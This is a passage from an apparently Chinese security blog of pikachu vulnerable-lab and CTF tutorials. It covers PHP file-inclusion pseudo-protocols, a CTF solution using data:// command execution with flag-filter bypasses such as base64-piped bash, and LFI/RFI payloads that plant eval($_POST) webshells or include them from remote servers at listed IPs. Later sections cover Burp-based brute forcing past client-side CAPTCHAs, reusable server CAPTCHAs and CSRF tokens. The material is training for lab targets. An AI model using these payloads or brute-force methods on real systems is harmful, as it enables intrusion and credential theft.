<h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off&#x2F;on</p>
<p>allow_url_fopen:off&#x2F;on</p>
<h5 id="必须使用绝对路径"><a href="#必须使用绝对路径" class="headerlink" title="必须使用绝对路径"></a>必须使用绝对路径</h5><p>file:&#x2F;&#x2F;绝对路径&#x2F;文件名</p>
<p><img src="/images/1665549685531-33aae4d1-c9f3-4214-ba02-e78c0ff7fa52.png" alt="img"></p>
<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>利用php流filter返回base64加密后的php源代码</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody></table>
<p>我们可以利用php的filter机制来得到我们想要的文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>

<h5 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h5><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt</a></p>
<p><img src="/images/1665549879949-97e9a3df-50ba-4574-876d-7bac85d67474.png" alt="img"></p>
<h5 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</a><a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p><img src="/images/1665549917113-330ca4b7-1487-44f7-8685-8b2e1d2961db.png" alt="img"></p>
<h5 id="可以利用此来包含一句话木马"><a href="#可以利用此来包含一句话木马" class="headerlink" title="可以利用此来包含一句话木马"></a>可以利用此来包含一句话木马</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>

<p>将一句话木马编码后放置在远程服务器上</p>
<p><img src="/images/1665550009883-f247beb2-fa3c-485b-aff5-2b4d2abc0b34.png" alt="img"></p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-decode/resource=http://101.35.17.6:6666/test.txt</a></p>
<p><img src="/images/1665550111038-486f417d-e512-4b90-bb8b-3c4fd955668f.png" alt="img"></p>
<p><img src="/images/1665550147767-2eb9da43-df4f-403b-80ab-f6b11ffa004b.png" alt="img"></p>
<h5 id="读取payload"><a href="#读取payload" class="headerlink" title="读取payload"></a>读取payload</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter//resource=test.txt</span><br><span class="line">//注意那两斜杠不能省</span><br><span class="line"></span><br><span class="line">base64编码解码</span><br><span class="line">file=php://filter/convert.base64-encode/resource=test.txt</span><br><span class="line">file=php://filter/convert.base64-decode/resource=test.txt</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=test.txt</span><br></pre></td></tr></table></figure>

<p>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
<p><img src="/images/1667208263840-995730b8-919e-413b-8c23-20de1420ef72.png" alt="img"></p>
<h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径)</p>
<h5 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
<p>allow_url_fopen:on</p>
<h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>使用绝对路径</p>
<p>必须是zip文件，但后缀无所谓</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip://绝对路径/压缩包文件#压缩包内的文件</span><br><span class="line"></span><br><span class="line">注意，#号必须url编码</span><br><span class="line"></span><br><span class="line">?file=zip://绝对路径/文件名%23压缩包内的文件</span><br></pre></td></tr></table></figure>

<p>注意，#号必须url编码</p>
<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=zip://D:/Desktop/test.zip%23test.txt</a></p>
<p><img src="/images/1665551479736-692dab58-19ba-4b50-919f-ba7a2728234f.png" alt="img"></p>
<p>.zip可以改为其他任意后缀，只要文件内容是zip的内容，就能通过zip协议正常解析</p>
<p><img src="/images/1665551787085-f3974026-477a-4d9f-a0e6-6d73ee681d22.png" alt="img"></p>
<h3 id="phar-x2F-x2F"><a href="#phar-x2F-x2F" class="headerlink" title="phar:&#x2F;&#x2F;"></a>phar:&#x2F;&#x2F;</h3><p>读取压缩包内的文件(绝对路径，相对路径都可以)</p>
<h5 id="限制条件-2"><a href="#限制条件-2" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off</p>
<p>allow_url_fopen:on</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>使用绝对路径即可</p>
<p><img src="/images/1665552085670-d65faa8e-7c35-4bd4-b7c6-3ddb931d96f3.png" alt="img"></p>
<p>同样，后缀不影响</p>
<p><img src="/images/1665552219256-d3e33144-a285-4508-a9eb-1b3d113ec534.png" alt="img"></p>
<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>该伪协议用在远程文件包含中</p>
<p>将post请求中的数据作为php代码执行</p>
<h5 id="限制条件-3"><a href="#限制条件-3" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
<p>allow_url_fopen:on&#x2F;off （默认on）</p>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://input</span><br></pre></td></tr></table></figure>

<p>include函数会将post的body中的php代码解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php @eval($_POST[123]);?&gt;&#x27;)?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665552740842-2fc06e76-2a33-47f5-91ad-54966d86098b.png" alt="img"></p>
<p>成功写入shell</p>
<p><img src="/images/1665552781766-418dfd08-3f0f-49d1-aca6-583a39cba4d9.png" alt="img"></p>
<p>成功连接</p>
<p><img src="/images/1665552813790-cfd814e9-89fd-451e-ae0e-62cb1174fa20.png" alt="img"></p>
<h3 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h3><p>读取数据流，如果传入的数据是php代码，就会执行代码</p>
<h5 id="限制条件-4"><a href="#限制条件-4" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:on (默认off)</p>
<p>allow_url_fopen:on（默认on）</p>
<h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">?file=data:text/plain,base64,（php的base64编码内容）</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665552983029-fcb88f2c-8787-4b43-adc0-f4dcf6ba34ad.png" alt="img"></p>
<h4 id="可以包含一句话木马"><a href="#可以包含一句话木马" class="headerlink" title="可以包含一句话木马"></a>可以包含一句话木马</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,&lt;?php eval($_POST[&quot;test&quot;]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/1665553091038-929159af-6752-4d6a-94a3-3aa1efbf9c89.png" alt="img"></p>
<h2 id="一道CTF题"><a href="#一道CTF题" class="headerlink" title="一道CTF题"></a>一道CTF题</h2><p>这是后面做完后读到的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">  if(strstr($_GET[&#x27;file&#x27;],&#x27;data://&#x27;) or $_GET[&#x27;file&#x27;]===&#x27;hello.txt&#x27;)</span><br><span class="line">  &#123;</span><br><span class="line">    if(preg_match(&quot;/(flag)/i&quot;,$_GET[&#x27;file&#x27;]) == 1)</span><br><span class="line">    &#123;</span><br><span class="line">      die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      include $_GET[&#x27;file&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;你以为你想包含什么就包含什么嘛？&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  header(&quot;Location:./index.php?file=hello.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h3><p>首先要通过get请求传递file参数</p>
<p>然后看参数中是否有data:&#x2F;&#x2F;或者file是否等于hello.txt</p>
<p>参数中不能包括flag</p>
<h3 id="ls查看文件"><a href="#ls查看文件" class="headerlink" title="ls查看文件"></a>ls查看文件</h3><p><a href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22ls%22);?%3E</a></p>
<p><img src="/images/1665988456872-620d4754-4c28-4824-ad98-c94cc9121279.png" alt="img"></p>
<p>不能直接cat该文件，因为包含“flag”</p>
<p><a href="http://218.94.126.122:31003/index.php?file=data://text/plain,">http://218.94.126.122:31003/index.php?file=data://text/plain,%3C?php%20system(%22cat%20flag_sdhalsd.php%22);?%3E</a></p>
<p><img src="/images/1665988596163-a8ab4cfd-0c5f-4f47-aea6-f1020bf0d755.png" alt="img"></p>
<h3 id="绕过“flag”"><a href="#绕过“flag”" class="headerlink" title="绕过“flag”"></a>绕过“flag”</h3><h5 id="1-可以通过cat-f-读取当前目录所有f开头的文件"><a href="#1-可以通过cat-f-读取当前目录所有f开头的文件" class="headerlink" title="1.可以通过cat f*读取当前目录所有f开头的文件"></a>1.可以通过cat f*读取当前目录所有f开头的文件</h5><p><img src="/images/1665988872945-496b2ace-1bd1-4fce-ad7f-8da9e42d1e28.png" alt="img"></p>
<h5 id="2-base64绕过"><a href="#2-base64绕过" class="headerlink" title="2.base64绕过"></a>2.base64绕过</h5><p><img src="/images/1665989231978-3ba62296-6db8-447f-bf9e-cce19cb8b604.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;echo &#x27;Y2F0IGZsYWdfc2RoYWxzZC5waHA=&#x27;|base64 -d|bash&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-反斜杠绕过"><a href="#3-反斜杠绕过" class="headerlink" title="3.反斜杠绕过"></a>3.反斜杠绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl\ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="4-1，-2和-绕过"><a href="#4-1，-2和-绕过" class="headerlink" title="4.$1，$2和$@绕过"></a>4.$1，$2和$@绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat fl$1ag_sdhalsd.php</span><br><span class="line">http://218.94.126.122:31003/index.php?file=data://text/plain,&lt;?php system(&quot;cat fl$1ag_sdhalsd.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<h1 id="本地文件包含-2"><a href="#本地文件包含-2" class="headerlink" title="本地文件包含"></a>本地文件包含</h1><p>本地文件包含，顾名思义就是包含本地的文件</p>
<p>可以写一个测试代码(该测试代码也可远程文件包含)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
<p><img src="/images/image-20230110103343335.png" alt="image-20230110103343335"></p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><img src="/images/image-20230110103439657.png" alt="image-20230110103439657"></p>
<p>可以看到传参为filename读取本地文件</p>
<p>更改为file2.php</p>
<p><img src="/images/image-20230110103559613.png" alt="image-20230110103559613"></p>
<p>如果此时能够通过文件上传或其他方式写入一个webshell，就可以通过本地文件包含访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>url为(不一定为php文件，txt里面放个木马也行)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../../../shell.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110104124430.png" alt="image-20230110104124430"></p>
<h1 id="远程文件包含-2"><a href="#远程文件包含-2" class="headerlink" title="远程文件包含"></a>远程文件包含</h1><p>远程文件包含，顾名思义，可以包含远程文件，如果源代码使用的是include,，那么包含的文件都会被显示出来，不一定是php</p>
<p>可以写一个测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
<p><img src="/images/image-20230110104347093.png" alt="image-20230110104347093"></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><p>可以在自己的服务器上放一个木马，远程文件包含利用</p>
<p><img src="/images/image-20230110104804316.png" alt="image-20230110104804316"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//其一个http服务供访问，监听22222端口</span><br><span class="line"></span><br><span class="line">python3 -m http.server 22222</span><br></pre></td></tr></table></figure>

<h5 id="远程文件包含-3"><a href="#远程文件包含-3" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/file_include/index.php?file=http://x.x.x.x:22222/test.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110104922768.png" alt="image-20230110104922768"></p>
<h3 id="伪协议利用"><a href="#伪协议利用" class="headerlink" title="伪协议利用"></a>伪协议利用</h3><p>使用data:text&#x2F;plain,伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p>url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:88/DX/file_include/index.php?file=data:text/plain,&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110105123160.png" alt="image-20230110105123160"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-暴力破解</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="暴力破解概述"><a href="#暴力破解概述" class="headerlink" title="暴力破解概述"></a>暴力破解概述</h1><p>当登录口未设置强安全机制，并且使用弱用户名弱口令，便存在被爆破成功风险。</p>
<p>下述所有操作都以最新版的burp为例。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>火狐浏览器安装foxproxy插件，用于设置代理转发</p>
<p><img src="/images/1660098471419-484afa6c-e238-44c3-bfb8-4b5b49c995ab.png" alt="img"></p>
<p>chrome可安装proxy switchomega插件</p>
<p><img src="/images/1660098708129-16ad2303-db87-459a-b8de-c65341cc0118.png" alt="img"></p>
<p>根据burp中的设置配置代理</p>
<p><img src="/images/1660098560458-6473cdb4-d4fb-4238-9154-4ab84d2f45e7.png" alt="img"></p>
<p>foxproxy配置</p>
<p><img src="/images/1660098604468-f69aa556-a378-4301-a063-8b225a30dedd.png" alt="img"></p>
<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><h3 id="火狐浏览器抓包问题"><a href="#火狐浏览器抓包问题" class="headerlink" title="火狐浏览器抓包问题"></a>火狐浏览器抓包问题</h3><p>火狐浏览器刚配置完代理抓包可能会抓到许多firefox的数据包</p>
<p><img src="/images/1660099283211-9e201c63-214b-477b-81a0-58f5784d036b.png" alt="img"></p>
<p>在浏览器中地址栏输入about:config</p>
<p>搜索</p>
<p>network.captive-portal-service</p>
<p>将下图标识处改为false即可</p>
<p><img src="/images/1660099437014-de6052d6-9592-41d5-9bc6-709c52c040ad.png" alt="img"></p>
<h3 id="burp抓不到https数据包问题"><a href="#burp抓不到https数据包问题" class="headerlink" title="burp抓不到https数据包问题"></a>burp抓不到https数据包问题</h3><p>由于https属于安全传输协议，需要证书支持，在未给浏览器安装burp证书时，就会出现抓不到https数据包或出现如下界面。</p>
<p><img src="/images/1660099664443-b5f63d68-8419-4752-b8bd-425c12c8a159.png" alt="img"></p>
<p>解决方式</p>
<p><a href="https://www.yuque.com/docs/share/7d445725-3de8-431e-a37a-e03a1c8be8c6#">https://www.yuque.com/docs/share/7d445725-3de8-431e-a37a-e03a1c8be8c6?#</a> 《浏览器安装burp证书》</p>
<h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p><img src="/images/1660100279409-0c3ba2a9-b2ea-43b2-b179-7ecd3f3bf60c.png" alt="img"></p>
<p>基于表单的暴力破解没有验证码机制和任何加密</p>
<p>配置代理直接抓包，可以看出账号密码为明文传输，右键发送intruder(爆破模块)</p>
<p><img src="/images/1660100460785-64778103-9fc5-4d9b-ab19-924ebbd77610.png" alt="img"></p>
<p>定位需要爆破的位置，选择第四种模式</p>
<p><img src="/images/1660100704305-906eedf8-4621-4132-85f8-0ae8b89e80b9.png" alt="img"></p>
<p>对于四种爆破模式，可以参考</p>
<p><a href="https://www.yuque.com/docs/share/506932ce-6561-4d4e-9494-95f3110ca7a9#">https://www.yuque.com/docs/share/506932ce-6561-4d4e-9494-95f3110ca7a9?#</a> 《burp intruder(爆破模块)四种模式》</p>
<p>指定position1的payload</p>
<p><img src="/images/1660111324413-258f3706-b3a0-4ad3-9896-0afe221e8ef3.png" alt="img">指定position2的payload</p>
<p><img src="/images/1660111364947-6d48526f-52fa-4e26-852a-11db8fefc36b.png" alt="img"></p>
<p>爆破成功</p>
<p><img src="/images/1660111405873-48fbd8a0-9e83-4dfb-8d82-bc26ca889f3a.png" alt="img"></p>
<h1 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h1><p>开启抓包，可以发现在刷新验证码时并没有捕获到发送到服务端的请求包</p>
<p>可以判断出这是在客户端上对用户输入的验证码进行判断，所以可以通过更改前端代码进行绕过。</p>
<p>直接f12</p>
<p>定位到验证码，直接删除class字段<img src="/images/1660113946019-2c20cab8-4bb1-44be-b401-f03a0bb159b5.png" alt="img"></p>
<p>class 属性大多数时候用于指向样式表中的类（class）。不过，也可以利用它通过 JavaScript 来改变带有指定 class 的 HTML 元素。</p>
<p>即class可以指定标签所对应的js代码，这里vcode指定的行为就是验证码的js函数<img src="/images/1660114519473-d821c73a-7390-4c44-bab8-246fb5f8503a.png" alt="img"></p>
<p>同上述一样，直接抓包爆破<img src="/images/1660114753302-5ec62fb5-da0b-4fb3-8584-ca296fe80958.png" alt="img"></p>
<h1 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h1><p>服务端可以通过对验证码进行验证从而防止弱口令被爆破，但由于验证码的时效性会导致验证码可以长时间有效，造成仍然可爆破的风险。</p>
<p>同样首先抓包，存在验证码</p>
<p>扔到重发器里</p>
<p><img src="/images/1660112138355-43cb2e50-3fd0-49ce-af91-edc070a59d22.png" alt="img"></p>
<p>注意，这里不要forward放包，卡住就好了</p>
<p>在repeater模块中，疯狂点send，可以发现响应包并无提示验证码失效等信息，即验证码存在长有效期。</p>
<p><img src="/images/1660112258142-e77c2e79-8df3-48b6-b6e8-902446b2c952.png" alt="img"></p>
<p>右键send intruder爆破模块</p>
<p><img src="/images/1660112412387-aeb0fec0-433b-45c4-8923-0cd87c668bd1.png" alt="img"></p>
<p><img src="/images/1660112771243-b18e8507-52be-4510-8df1-68375205d903.png" alt="img"></p>
<p>然后之后的步骤就和前一题的步骤相同了，注意就是不要放包，或把浏览器代理关了再放包。</p>
<p>主要是为了拦截浏览器对验证码的新的请求，如下，防止验证码刷新。</p>
<p><img src="/images/1660113038650-edf5fa42-247c-49d9-aef6-54d33e5a9692.png" alt="img"></p>
<h1 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h1><p>token是服务端返回的一个字符串，用于验证客户端的请求。</p>
<p>需要配合正确的token才可以登录，用户名密码错误就会显示csrf token error</p>
<p><img src="/images/1660115122309-ec98021e-3434-481a-860b-846179afe5c4.png" alt="img"></p>
<p>首先抓个包看看</p>
<p>请求包</p>
<p><img src="/images/1660146068145-e3f17cad-8879-49bd-b9fb-b1a68dafe554.png" alt="img"></p>
<p>返回包，其中存在一个token的value值</p>
<p><img src="/images/1660145953993-38c92455-684f-4736-a036-deab6f219f1f.png" alt="img"></p>
<p>放包后，输入账号密码进行抓包，发现还携带了一个token字段，正是之前刷新页面所返回的token值</p>
<p><img src="/images/1660145945546-10033395-12ae-490c-80a9-a290c8fd9cf6.png" alt="img"></p>
<p>这里利用爆破模块重发几个数据包看看</p>
<p><img src="/images/1660146502450-23fddd58-c9ae-4d89-b891-9442b088862e.png" alt="img"></p>
<p>可以发现，每个请求包过后，token的value都会变化</p>
<p>想要爆破就必须对每一次token值进行填充</p>
<p>而我们知道，token是刷新页面后得到的，并且可以在网页源代码中得到</p>
<p>所以想要爆破弱口令，首先就需要将每一次新的token取出进行填充</p>
<p>为了演示方便，只添加passwd和token俩个position进行爆破</p>
<p>并且，这里由于发一次包token就失效了，所以需要采用爆破的第三种模式</p>
<p><img src="/images/1660147708137-e1d2ce4c-d5d7-4473-b841-c700bb9adac3.png" alt="img"></p>
<p>在Options下的Grep-Extract中提取token（该功能可以通过正则提取返回信息中的内容）</p>
<p>点击Add添加攻击需要用到的信息(user_token)</p>
<p><img src="/images/1660148121857-c7abd49d-7ceb-4e45-afa6-d7cd431a1fd8.png" alt="img"></p>
<p>点击Fetch response后在返回的代码中找到token的value，并将其选中后复制(后续用到)</p>
<p><img src="/images/1660180268397-d39d3b95-6e08-402a-8d73-06673683e956.png" alt="img"></p>
<p>ok后会添加一条新规则</p>
<p><img src="/images/1660180485320-a3694f40-5d31-40f3-b301-b2cccde64dc4.png" alt="img"></p>
<p>position1密码字段还和之前一样，使用simple list就行</p>
<p><img src="/images/1660180576308-ee6b3639-d0ea-4000-8dab-a6d6a1a620f2.png" alt="img"></p>
<p>position2 token字段，需要使用Recursive grep，匹配刚刚选择的正则</p>
<p><img src="/images/1660180674260-44f202d0-47d1-44e6-a0b5-d941e4dc7187.png" alt="img"></p>
<p><img src="/images/1660180984675-6c273c9e-0941-4576-9474-2101d3d6f2e6.png" alt="img"></p>
<p>注意这里将刚刚复制的token的value值填充，用于爆破的第一次请求</p>
<p>这上面的操作，就是将请求后返回的响应包中的token的value值，填充到下一次请求包中的token字段。</p>
<p>这里还需要对并发数进行设置（resource pool）</p>
<p>因为每一次新的请求，都需要上一次请求返回的响应包中的token的value进行填充</p>
<p>所以需要将并发数改为1</p>
<p><img src="/images/1660181712957-f7b567a3-cc1f-4794-84f1-1e474f000abe.png" alt="img"></p>
<p>然后开始爆破，可以看出token值也在变化</p>
<p>成功爆破出密码</p>
<p><img src="/images/1660181900272-83634187-4a90-431f-8908-7c97343f2830.png" alt="img"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-环境部署</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
<p>windows上使用phpstudy搭建</p>
<p>下述以windows为例</p>
<h3 id="pikachu下载链接"><a href="#pikachu下载链接" class="headerlink" title="pikachu下载链接"></a>pikachu下载链接</h3><p><a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
<h3 id="phpstudy下载链接"><a href="#phpstudy下载链接" class="headerlink" title="phpstudy下载链接"></a>phpstudy下载链接</h3><p><a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></p>
<h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>需要使用php 5.6版本，别搞太高了问题都不大</p>
<p><img src="/images/1663473977746-571a7526-a3d8-4c08-a482-ff660a526735.png" alt="img"></p>
<p>在这里面修改自己的php版本</p>
<p><img src="/images/1663474059051-8bc29887-7653-43e6-b42c-f8cf6b1f88a7.png" alt="img"></p>
<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>数据库使用5.0版本</p>
<p><img src="/images/1663474111537-28b43306-3ff8-4e40-95ab-b86aea6f87fe.png" alt="img"></p>
<p><img src="/images/1660097657076-ec17be27-2b11-4054-a851-654fc2321f1a.png" alt="img"></p>
<h3 id="启动后新建数据库"><a href="#启动后新建数据库" class="headerlink" title="启动后新建数据库"></a>启动后新建数据库</h3><p>这里主要是配置pikachu的数据库环境</p>
<p><img src="/images/1663474183436-05a3186d-521e-4105-87f2-b00960ef11f5.png" alt="img"></p>
<h3 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h3><p>解压后可以自己重命名(之后访问的路径)，放到phpstudy的根目录下</p>
<p><img src="/images/1663475005203-02c5c0e7-5a86-4f12-a483-d98edaf3f6d4.png" alt="img"></p>
<p>找到此配置文件\pikachu\inc\config.inc.php</p>
<p>修改数据库相关信息，即上述在phpstudy中新建的pikachu数据库</p>
<p><img src="/images/1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
<p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
<p><img src="/images/1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
]]></content>
      <categories>
        <category>pikachu靶场系列</category>
      </categories>
  </entry>
  <entry>
    <title>pikachu靶场系列-目录遍历</title>
    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
<p>很像本地文件包含</p>
<p>如果是linux系统，可以访问</p>
